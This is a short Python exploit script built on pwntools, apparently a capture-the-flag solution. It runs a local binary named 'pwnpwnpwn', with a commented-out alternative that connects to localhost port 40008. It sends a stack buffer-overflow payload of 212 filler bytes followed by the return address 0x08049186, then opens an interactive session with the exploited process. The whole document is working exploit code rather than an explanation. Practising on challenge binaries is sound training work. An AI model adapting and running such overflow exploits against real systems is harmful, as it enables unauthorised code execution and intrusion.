from pwn import *
sh = process("./bin/pwnpwnpwn")
#sh=remote("localhost",40008)
a =sh.recv
payload = b"A"*212 + p32(0x08049186)
sh.sendline(payload)
sh.interactive()
